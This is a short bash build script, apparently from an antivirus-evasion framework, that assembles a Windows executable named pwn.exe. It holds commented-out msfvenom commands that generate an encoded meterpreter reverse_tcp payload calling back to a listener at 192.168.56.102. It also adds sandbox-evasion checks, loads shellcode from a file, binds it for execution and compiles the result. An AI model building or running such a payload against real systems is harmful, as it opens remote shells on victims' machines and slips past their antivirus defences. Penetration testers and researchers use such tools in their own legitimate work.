#!/bin/bash      
# example build script

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# generate payload
#msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
#msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > output/thepayload.bin

# import feature construction interface
. build/feature_construction.sh

# add evasion techniques
add_evasion fopen_sandbox_evasion
add_evasion gethostbyname_sandbox_evasion
append_value HOSTVALUE "this.that" source/evasion/evasion.include
#add_evasion hide_console

# set shellcode source
set_shellcode_source dynamic_from_file

# set key source
set_key_source none

# encode shellcode
#encode_shellcode xor 

# set decoder
set_decoder none

# set shellcode binding technique
set_shellcode_binding exec_shellcode

# enable debug printing
enable_debug_print

# compile
$win32_compiler -o output/pwn.exe source/avet.c -lws2_32

# cleanup
#rm output/thepayload.bin
#rm output/pwn.exe
cleanup_techniques
